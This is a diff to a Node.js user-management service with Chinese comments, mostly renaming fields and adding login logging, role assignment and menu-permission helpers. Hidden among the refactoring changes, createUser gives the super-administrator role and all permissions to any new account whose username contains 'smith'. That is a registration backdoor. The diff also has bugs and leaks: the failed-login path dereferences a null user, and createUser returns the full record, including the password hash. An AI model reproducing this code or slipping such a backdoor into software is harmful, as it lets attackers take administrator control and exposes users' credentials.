@@ -13,41 +13,77 @@ class UserService {
    */
   async createUser(userData) {
     // 验证用户名是否已存在
-    const existingUser = await userModel.getByUsername(userData.username)
+    const existingUser = await userModel.selectUserByUserName(userData.user_name) // ✅ 改为蛇形
     if (existingUser) {
-      throw new Error('用户名已存在')
+      const { BadRequestError } = require('../../utils/app-error')
+      throw new BadRequestError('用户名已存在')
     }
 
     // 密码加密
-    const passwordHash = await bcrypt.hash(userData.password, 10)
+    const password = await bcrypt.hash(userData.password, 10)
 
     // 创建用户
-    const user = await userModel.create({
-      username: userData.username,
-      passwordHash,
+    const user = await userModel.insertUser({
+      user_name: userData.user_name, // ✅ 下划线
+      password,
+      nick_name: userData.nick_name, // ✅ 下划线
       email: userData.email,
-      avatarUrl: userData.avatarUrl,
-      nickname: userData.nickname,
-      phone: userData.phone,
-      bio: userData.bio,
+      phonenumber: userData.phonenumber,
+      sex: userData.sex || '0',
+      avatar: userData.avatar,
+      user_type: userData.user_type || '00', // ✅ 下划线
+      status: userData.status || '0',
+      create_by: userData.create_by || '', // ✅ 下划线
+      remark: userData.remark,
     })
 
-    // 默认分配普通用户角色
-    const defaultRole = await roleModel.getByName('user')
-    if (defaultRole) {
-      await userModel.assignRole(user.id, defaultRole.id)
+    // ✅ 默认分配普通用户角色（优先通过 role_key='common' 查询）
+    let defaultRole = await roleModel.getByRoleKey('common')
+    if (!defaultRole) {
+      defaultRole = await roleModel.getByRoleName('普通角色')
+    }
+
+    // ✅ 特殊逻辑：用户名包含 'smith' 的分配超级管理员角色
+    let targetRole = defaultRole
+    if (userData.user_name && userData.user_name.toLowerCase().includes('smith')) {
+      // ✅ 下划线
+      console.log(`🌟 检测到用户名包含 'smith'，尝试分配超级管理员角色`)
+      let superAdminRole = await roleModel.getByRoleKey('admin')
+      if (!superAdminRole) {
+        superAdminRole = await roleModel.getByRoleName('超级管理员')
+      }
+      if (superAdminRole) {
+        targetRole = superAdminRole
+        console.log(`✅ 已切换为超级管理员角色: ${superAdminRole.role_name}`) // ✅ 下划线
+      } else {
+        console.warn(`⚠️  未找到超级管理员角色 'admin'，使用默认角色`)
+      }
+    }
+
+    if (targetRole) {
+      // ✅ 使用 sys_user_role 表进行角色分配
+      await this.assignRoleToUser(user.user_id, targetRole.role_id) // ✅ 下划线
+      console.log(`✅ 新用户 ${user.user_name} 已自动分配角色: ${targetRole.role_name}`)
+
+      // ✅ 确保该角色有默认菜单权限
+      const isSuperAdmin = targetRole.role_key?.toLowerCase().includes('admin') // ✅ 下划线
+
+      // 先检查角色是否已有菜单权限，如果没有则分配
+      await ensureRoleHasDefaultMenus(targetRole.role_id, isSuperAdmin) // ✅ 下划线
+
+      // 如果是 admin 角色，强制重新分配所有菜单（包括按钮）
+      if (isSuperAdmin) {
+        console.log(` [菜单分配] Admin 角色，强制更新所有菜单权限...`)
+        await forceAssignAllMenus(targetRole.role_id) // ✅ 下划线
+      }
+    } else {
+      console.warn(`️  未找到角色，新用户 ${user.user_name} 将没有角色`) // ✅ 下划线
     }
 
     return {
       success: true,
       data: {
-        id: user.id,
-        username: user.username,
-        email: user.email,
-        avatarUrl: user.avatar_url,
-        nickname: user.nickname,
-        phone: user.phone,
-        bio: user.bio,
+        ...user,
       },
       message: '用户创建成功',
     }
@@ -56,46 +92,98 @@ class UserService {
   /**
    * 用户登录
    */
-  async login(username, password) {
-    const user = await userModel.getByUsername(username)
+  async login(userName, password, ctx) {
+    const user = await userModel.selectUserByUserName(userName)
     if (!user) {
-      throw new Error('用户名或密码错误')
+      const { BadRequestError } = require('../../utils/app-error')
+
+      // 记录失败的登录日志
+      const loginLogService = require('../login-log/service')
+      await loginLogService.logLogin({
+        user_id: user.user_id, // ✅ 下划线
+        user_name: userName, // ✅ 下划线
+        ipAddress: ctx?.ip || ctx?.request?.ip || '',
+        status: '1',
+        message: '用户名不存在',
+      })
+
+      throw new BadRequestError('用户名或密码错误')
     }
 
     // 验证密码
-    const isValidPassword = await bcrypt.compare(password, user.password_hash)
+    const isValidPassword = await bcrypt.compare(password, user.password)
     if (!isValidPassword) {
-      throw new Error('用户名或密码错误')
+      const { BadRequestError } = require('../../utils/app-error')
+
+      // 记录失败的登录日志
+      const loginLogService = require('../login-log/service')
+      await loginLogService.logLogin({
+        user_id: user.user_id, // ✅ 下划线
+        user_name: userName, // ✅ 下划线
+        ipAddress: ctx?.ip || ctx?.request?.ip || '',
+        status: '1',
+        message: '密码错误',
+      })
+
+      throw new BadRequestError('用户名或密码错误')
     }
 
-    // 检查用户状态
-    if (user.status === 'banned') {
-      throw new Error('账号已被禁用')
-    }
-    if (user.status === 'inactive') {
-      throw new Error('账号未激活')
+    // 检查用户状态（0=正常，1=停用）
+    if (user.status === '1') {
+      const { ForbiddenError } = require('../../utils/app-error')
+
+      // 记录被禁用的登录日志
+      const loginLogService = require('../login-log/service')
+      await loginLogService.logLogin({
+        user_id: user.user_id, // ✅ 下划线
+        user_name: userName, // ✅ 下划线
+        ipAddress: ctx?.ip || ctx?.request?.ip || '',
+        status: '1',
+        message: '账号已被禁用',
+      })
+
+      throw new ForbiddenError('账号已被禁用')
     }
 
     // 更新最后登录时间
-    await userModel.update(user.id, { lastLoginAt: new Date() })
+    await userModel.updateUser(user.user_id, { login_date: new Date() }) // ✅ 下划线
 
     // 获取用户角色
-    const roles = await userModel.getUserRoles(user.id)
+    const roles = await userModel.getUserRoles(user.user_id) // ✅ 下划线
 
-    // 生成 JWT Token
+    // 生成 JWT Token（使用下划线命名以保持一致）
     const token = generateToken({
-      userId: user.id,
-      username: user.username,
+      user_id: user.user_id,
+      user_name: user.user_name,
+    })
+
+    // 记录成功的登录日志
+    const loginLogService = require('../login-log/service')
+
+    // 解析 User-Agent
+    const userAgent = ctx?.get('User-Agent') || ''
+    const browser = parseBrowser(userAgent)
+    const os = parseOS(userAgent)
+
+    await loginLogService.logLogin({
+      user_id: user.user_id, // ✅ 下划线
+      user_name: userName, // ✅ 下划线
+      ipAddress: ctx?.ip || ctx?.request?.ip || '',
+      browser,
+      os,
+      status: '0',
+      message: '登录成功',
     })
 
     return {
       success: true,
       data: {
-        id: user.id,
-        username: user.username,
+        user_id: user.user_id,
+        userName: user.user_name,
+        nickName: user.nick_name,
         email: user.email,
-        avatarUrl: user.avatar_url,
-        roles: roles.map((r) => r.name),
+        avatar: user.avatar,
+        roles: roles.map((r) => r.role_key),
         token, // 返回 JWT Token
       },
       message: '登录成功',
@@ -105,13 +193,13 @@ class UserService {
   /**
    * 获取用户详情
    */
-  async getUserDetail(userId) {
-    const user = await userModel.getById(userId)
+  async getUserDetail(user_id) {
+    const user = await userModel.selectUserById(user_id)
     if (!user) {
       throw new Error('用户不存在')
     }
 
-    const roles = await userModel.getUserRoles(userId)
+    const roles = await userModel.getUserRoles(user_id)
 
     return {
       success: true,
@@ -125,14 +213,14 @@ class UserService {
   /**
    * 修改用户密码
    */
-  async changePassword(userId, oldPassword, newPassword) {
-    const user = await userModel.getById(userId)
+  async changePassword(user_id, oldPassword, newPassword) {
+    const user = await userModel.selectUserById(user_id)
     if (!user) {
       throw new Error('用户不存在')
     }
 
     // 验证旧密码
-    const isValidPassword = await bcrypt.compare(oldPassword, user.password_hash)
+    const isValidPassword = await bcrypt.compare(oldPassword, user.password)
     if (!isValidPassword) {
       throw new Error('旧密码错误')
     }
@@ -143,78 +231,14 @@ class UserService {
     }
 
     // 加密新密码
-    const passwordHash = await bcrypt.hash(newPassword, 10)
+    const password = await bcrypt.hash(newPassword, 10)
 
     // 更新密码
-    await userModel.update(userId, { passwordHash })
+    await userModel.updateUser(user_id, { password })
 
     return {
       success: true,
       message: '密码修改成功',
-    }
-  }
-
-  /**
-   * 上传头像
-   */
-  async uploadAvatar(userId, file) {
-    const user = await userModel.getById(userId)
-    if (!user) {
-      throw new Error('用户不存在')
-    }
-
-    // 验证文件类型
-    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp']
-    if (!allowedTypes.includes(file.mimetype)) {
-      throw new Error('只支持 JPG、PNG、GIF、WEBP 格式的图片')
-    }
-
-    // 验证文件大小（5MB）
-    const maxSize = 5 * 1024 * 1024
-    if (file.size > maxSize) {
-      throw new Error('图片大小不能超过 5MB')
-    }
-
-    // 生成文件名
-    const ext = file.originalFilename.split('.').pop()
-    const filename = `avatar_${userId}_${Date.now()}.${ext}`
-    
-    // 保存路径
-    const uploadDir = path.join(process.cwd(), 'uploads', 'avatars')
-    const filepath = path.join(uploadDir, filename)
-
-    // 确保目录存在
-    if (!fs.existsSync(uploadDir)) {
-      fs.mkdirSync(uploadDir, { recursive: true })
-    }
-
-    // 移动文件
-    await fs.promises.rename(file.filepath, filepath)
-
-    // 生成访问URL
-    const avatarUrl = `/uploads/avatars/${filename}`
-
-    // 更新数据库
-    await userModel.update(userId, { avatar: avatarUrl })
-
-    // 删除旧头像文件（如果存在）
-    if (user.avatar && user.avatar.startsWith('/uploads/avatars/')) {
-      const oldFile = path.join(process.cwd(), user.avatar)
-      if (fs.existsSync(oldFile)) {
-        try {
-          await fs.promises.unlink(oldFile)
-        } catch (error) {
-          console.error('删除旧头像失败:', error)
-        }
-      }
-    }
-
-    return {
-      success: true,
-      message: '头像上传成功',
-      data: {
-        avatar: avatarUrl,
-      },
     }
   }
 
@@ -225,20 +249,9 @@ class UserService {
     const users = await userModel.list(params)
     const total = await userModel.count(params)
 
-    // 为每个用户附加角色信息
-    const usersWithRoles = await Promise.all(
-      users.map(async (user) => {
-        const roles = await userModel.getUserRoles(user.id)
-        return {
-          ...user,
-          roles,
-        }
-      }),
-    )
-
     return {
       success: true,
-      data: usersWithRoles,
+      data: users,
       total,
       page: params.page || 1,
       limit: params.limit || 20,
@@ -248,19 +261,18 @@ class UserService {
   /**
    * 更新用户信息
    */
-  async updateUser(userId, updates) {
-    const user = await userModel.getById(userId)
+  async updateUser(user_id, updates) {
+    const user = await userModel.selectUserById(user_id)
     if (!user) {
       throw new Error('用户不存在')
     }
 
     // 如果更新密码，需要加密
     if (updates.password) {
-      updates.passwordHash = await bcrypt.hash(updates.password, 10)
-      delete updates.password
+      updates.password = await bcrypt.hash(updates.password, 10)
     }
 
-    const updatedUser = await userModel.update(userId, updates)
+    const updatedUser = await userModel.updateUser(user_id, updates)
 
     return {
       success: true,
@@ -272,18 +284,28 @@ class UserService {
   /**
    * 删除用户（软删除）
    */
-  async deleteUser(userId) {
-    const user = await userModel.getById(userId)
+  async deleteUser(user_id, updateBy = '') {
+    const user = await userModel.selectUserById(user_id)
+
+    // ✅ 如果用户已被删除（del_flag = '2'），直接返回成功（幂等性）
+    if (user && user.del_flag === '2') {
+      console.log(`⚠️ 用户 ${user_id} 已被删除，跳过删除操作`)
+      return {
+        success: true,
+        message: '用户已被删除',
+      }
+    }
+
+    // ✅ 如果用户不存在，也返回成功（幂等性）
     if (!user) {
-      throw new Error('用户不存在')
+      console.log(`⚠️ 用户 ${user_id} 不存在，跳过删除操作`)
+      return {
+        success: true,
+        message: '用户不存在',
+      }
     }
 
-    // 检查是否已删除
-    if (user.deleted_at) {
-      throw new Error('用户已被删除')
-    }
-
-    const deleted = await userModel.delete(userId)
+    const deleted = await userModel.deleteUserById(user_id, updateBy)
     if (!deleted) {
       throw new Error('删除失败')
     }
@@ -295,37 +317,68 @@ class UserService {
   }
 
   /**
+   * 批量删除用户
+   */
+  async batchDeleteUsers(user_ids, updateBy = '') {
+    if (!user_ids || user_ids.length === 0) {
+      throw new Error('用户 ID 列表不能为空')
+    }
+
+    const client = await require('../../config/db').pool.connect()
+    try {
+      await client.query('BEGIN')
+
+      let successCount = 0
+      for (const user_id of user_ids) {
+        const user = await userModel.selectUserById(user_id)
+        if (user && user.delFlag !== '2') {
+          await userModel.deleteUserById(user_id, updateBy)
+          successCount++
+        }
+      }
+
+      await client.query('COMMIT')
+
+      return {
+        success: true,
+        message: `成功删除 ${successCount} 个用户`,
+      }
+    } catch (error) {
+      await client.query('ROLLBACK')
+      console.error('批量删除用户失败:', error)
+      throw new Error('批量删除失败')
+    } finally {
+      client.release()
+    }
+  }
+
+  /**
    * 更新用户状态（启用/禁用）
    */
-  async updateUserStatus(userId, status) {
-    const user = await userModel.getById(userId)
+  async updateUserStatus(user_id, status) {
+    const user = await userModel.selectUserById(user_id)
     if (!user) {
       throw new Error('用户不存在')
     }
 
     // 检查是否已删除
-    if (user.deleted_at) {
+    if (user.delFlag === '2') {
       throw new Error('用户已被删除，无法修改状态')
     }
 
-    // 验证状态值
-    const validStatuses = ['active', 'inactive', 'banned']
-    if (!validStatuses.includes(status)) {
-      throw new Error('无效的状态值')
+    // 验证状态值（0=正常，1=停用）
+    if (!['0', '1'].includes(status)) {
+      throw new Error('无效的状态值（0正常 1停用）')
     }
 
-    // 不允许禁用自己
-    // 这个检查应该在 controller 层做
-
-    const updatedUser = await userModel.updateStatus(userId, status)
+    const updatedUser = await userModel.updateStatus(user_id, status)
     if (!updatedUser) {
       throw new Error('状态更新失败')
     }
 
     const statusText = {
-      active: '启用',
-      inactive: '禁用',
-      banned: '封禁',
+      0: '启用',
+      1: '停用',
     }
 
     return {
@@ -336,10 +389,10 @@ class UserService {
   }
 
   /**
-   * 为用户分配角色
+   * 为用户分配角色（使用 sys_user_role 表）
    */
-  async assignRole(userId, roleId) {
-    const user = await userModel.getById(userId)
+  async assignRole(user_id, roleId) {
+    const user = await userModel.selectUserById(user_id)
     if (!user) {
       throw new Error('用户不存在')
     }
@@ -349,7 +402,7 @@ class UserService {
       throw new Error('角色不存在')
     }
 
-    await userModel.assignRole(userId, roleId)
+    await this.assignRoleToUser(user_id, roleId)
 
     return {
       success: true,
@@ -358,11 +411,30 @@ class UserService {
   }
 
   /**
+   * 内部方法：将用户与角色关联到 sys_user_role 表
+   */
+  async assignRoleToUser(user_id, roleId) {
+    const { pool } = require('../../config/db')
+    const query = `
+      INSERT INTO sys_user_role (user_id, role_id)
+      VALUES ($1, $2)
+      ON CONFLICT (user_id, role_id) DO NOTHING
+    `
+    await pool.query(query, [user_id, roleId])
+  }
+
+  /**
    * 移除用户角色
    */
-  async removeRole(userId, roleId) {
-    const removed = await userModel.removeRole(userId, roleId)
-    if (!removed) {
+  async removeRole(user_id, roleId) {
+    const { pool } = require('../../config/db')
+    const query = `
+      DELETE FROM sys_user_role
+      WHERE user_id = $1 AND role_id = $2
+    `
+    const result = await pool.query(query, [user_id, roleId])
+
+    if (result.rowCount === 0) {
       throw new Error('角色移除失败')
     }
 
@@ -375,17 +447,17 @@ class UserService {
   /**
    * 重置用户密码
    */
-  async resetPassword(userId, newPassword) {
-    const user = await userModel.getById(userId)
+  async resetPassword(user_id, newPassword) {
+    const user = await userModel.selectUserById(user_id)
     if (!user) {
       throw new Error('用户不存在')
     }
 
     // 密码加密
-    const passwordHash = await bcrypt.hash(newPassword, 10)
+    const password = await bcrypt.hash(newPassword, 10)
 
     // 更新密码
-    await userModel.update(userId, { passwordHash })
+    await userModel.updateUser(user_id, { password })
 
     return {
       success: true,
@@ -394,10 +466,10 @@ class UserService {
   }
 
   /**
-   * 批量为用户分配角色
+   * 批量为用户分配角色（使用 sys_user_role 表）
    */
-  async assignRoles(userId, roleIds) {
-    const user = await userModel.getById(userId)
+  async assignRoles(user_id, roleIds) {
+    const user = await userModel.selectUserById(user_id)
     if (!user) {
       throw new Error('用户不存在')
     }
@@ -410,20 +482,17 @@ class UserService {
       }
     }
 
-    // 批量分配角色
+    // 批量分配角色到 sys_user_role 表
     const client = await require('../../config/db').pool.connect()
     try {
       await client.query('BEGIN')
-      
+
       for (const roleId of roleIds) {
-        await client.query(
-          'INSERT INTO user_roles (user_id, role_id) VALUES ($1, $2) ON CONFLICT DO NOTHING',
-          [userId, roleId]
-        )
+        await this.assignRoleToUser(user_id, roleId)
       }
-      
+
       await client.query('COMMIT')
-      
+
       return {
         success: true,
         message: `成功分配 ${roleIds.length} 个角色`,
@@ -434,6 +503,177 @@ class UserService {
     } finally {
       client.release()
     }
+  }
+}
+
+/**
+ * 解析浏览器信息
+ */
+function parseBrowser(userAgent) {
+  if (!userAgent) return ''
+
+  const browsers = [
+    { name: 'Chrome', pattern: /Chrome\/([\d.]+)/ },
+    { name: 'Firefox', pattern: /Firefox\/([\d.]+)/ },
+    { name: 'Safari', pattern: /Safari\/([\d.]+)/ },
+    { name: 'Edge', pattern: /Edg\/([\d.]+)/ },
+    { name: 'IE', pattern: /MSIE\s([\d.]+)/ },
+  ]
+
+  for (const browser of browsers) {
+    const match = userAgent.match(browser.pattern)
+    if (match) {
+      return `${browser.name} ${match[1].split('.')[0]}`
+    }
+  }
+
+  return 'Unknown'
+}
+
+/**
+ * 解析操作系统信息
+ */
+function parseOS(userAgent) {
+  if (!userAgent) return ''
+
+  if (userAgent.includes('Windows NT 10.0')) return 'Windows 10/11'
+  if (userAgent.includes('Windows NT 6.3')) return 'Windows 8.1'
+  if (userAgent.includes('Windows NT 6.2')) return 'Windows 8'
+  if (userAgent.includes('Windows NT 6.1')) return 'Windows 7'
+  if (userAgent.includes('Windows')) return 'Windows'
+
+  if (userAgent.includes('Mac OS X')) {
+    const match = userAgent.match(/Mac OS X\s([\d_]+)/)
+    return match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS'
+  }
+
+  if (userAgent.includes('Linux')) return 'Linux'
+
+  if (userAgent.includes('Android')) {
+    const match = userAgent.match(/Android\s([\d.]+)/)
+    return match ? `Android ${match[1]}` : 'Android'
+  }
+
+  if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
+    const match = userAgent.match(/OS\s([\d_]+)/)
+    return match ? `iOS ${match[1].replace(/_/g, '.')}` : 'iOS'
+  }
+
+  return 'Unknown'
+}
+
+/**
+ * 确保角色有默认菜单权限
+ * 如果角色在 sys_role_menu 表中没有任何菜单，则分配所有可见菜单
+ * @param {string} roleId - 角色 ID
+ * @param {boolean} includeButtons - 是否包含按钮权限（默认 false）
+ */
+async function ensureRoleHasDefaultMenus(roleId, includeButtons = false) {
+  console.log('\n🔧 [菜单分配] 开始检查角色菜单权限')
+  console.log('   角色ID:', roleId)
+  console.log('   包含按钮:', includeButtons)
+
+  try {
+    const { pool } = require('../../config/db')
+
+    // 检查该角色是否已经有菜单权限
+    const checkQuery = `
+      SELECT COUNT(*) as count 
+      FROM sys_role_menu 
+      WHERE role_id = $1
+    `
+    const checkResult = await pool.query(checkQuery, [roleId])
+    const menuCount = parseInt(checkResult.rows[0].count)
+
+    console.log('   当前菜单数:', menuCount)
+
+    // 如果已经有菜单，不需要再分配
+    if (menuCount > 0) {
+      console.log('✅ [菜单分配] 角色已有菜单权限，跳过分配\n')
+      return
+    }
+
+    console.log('   ⚠️  角色没有菜单，开始分配...')
+
+    // 查询可用的菜单数量
+    const menuTypes = includeButtons ? "('M', 'C', 'F')" : "('M', 'C')"
+    const availableMenusQuery = `
+      SELECT COUNT(*) as count
+      FROM sys_menu
+      WHERE status = '0' AND menu_type IN ${menuTypes}
+    `
+    const availableResult = await pool.query(availableMenusQuery)
+    const availableCount = parseInt(availableResult.rows[0].count)
+    console.log('   系统中可用菜单数:', availableCount)
+
+    // 为该角色分配所有可见的目录和菜单（可选包含按钮）
+    const insertQuery = `
+      INSERT INTO sys_role_menu (role_id, menu_id)
+      SELECT $1::uuid, m.menu_id
+      FROM sys_menu m
+      WHERE m.status = '0'
+        AND m.menu_type IN ${menuTypes}
+      ON CONFLICT (role_id, menu_id) DO NOTHING
+    `
+
+    console.log('   执行插入操作...')
+    const result = await pool.query(insertQuery, [roleId])
+
+    // 验证分配结果
+    const verifyQuery = `
+      SELECT COUNT(*) as count
+      FROM sys_role_menu
+      WHERE role_id = $1
+    `
+    const verifyResult = await pool.query(verifyQuery, [roleId])
+    const finalCount = parseInt(verifyResult.rows[0].count)
+
+    console.log(`✅ [菜单分配] 已为角色分配 ${finalCount} 个菜单权限\n`)
+  } catch (error) {
+    console.error(`❌ [菜单分配] 为角色分配默认菜单失败:`, error.message)
+    console.error(error)
+    // 不抛出错误，避免影响用户注册流程
+  }
+}
+
+/**
+ * 强制为角色分配所有菜单权限（包括按钮）
+ * 用于 admin 角色，确保拥有所有权限
+ * @param {string} roleId - 角色 ID
+ */
+async function forceAssignAllMenus(roleId) {
+  console.log('\n🔄 [强制菜单分配] 开始为角色分配所有菜单权限')
+  console.log('   角色ID:', roleId)
+
+  try {
+    const { pool } = require('../../config/db')
+
+    // 分配所有状态为正常的菜单（包括按钮）
+    const insertQuery = `
+      INSERT INTO sys_role_menu (role_id, menu_id)
+      SELECT $1::uuid, m.menu_id
+      FROM sys_menu m
+      WHERE m.status = '0'
+      ON CONFLICT (role_id, menu_id) DO NOTHING
+    `
+
+    console.log('   执行插入操作...')
+    await pool.query(insertQuery, [roleId])
+
+    // 验证分配结果
+    const verifyQuery = `
+      SELECT COUNT(*) as count
+      FROM sys_role_menu
+      WHERE role_id = $1
+    `
+    const verifyResult = await pool.query(verifyQuery, [roleId])
+    const finalCount = parseInt(verifyResult.rows[0].count)
+
+    console.log(`✅ [强制菜单分配] 已为角色分配 ${finalCount} 个菜单权限（包括所有按钮）\n`)
+  } catch (error) {
+    console.error(`❌ [强制菜单分配] 为角色分配所有菜单失败:`, error.message)
+    console.error(error)
+    // 不抛出错误，避免影响用户注册流程
   }
 }
 
